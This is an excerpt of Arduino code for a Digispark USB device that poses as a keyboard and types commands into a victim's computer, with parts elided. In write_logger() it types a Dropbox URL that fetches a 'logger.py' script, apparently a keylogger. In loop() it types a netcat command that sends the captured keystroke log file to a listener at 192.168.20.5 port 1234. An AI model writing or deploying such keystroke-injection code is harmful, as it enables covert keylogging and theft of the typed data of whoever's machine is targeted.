...
void loop() {
  if (not finished) {
    ...
    //  You will have a terminal window open for listening, so open another terminal window to
    ...
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print("  nc 192.168.20.5 1234 < ~/Documents/testing_log/logged_text.txt");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
...
void write_logger() {
    ...
    DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
    DigiKeyboard.print(" https://www.dl.dropboxusercontent.com/s/u34rsg5bguh95uq/logger.py?dl=0");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
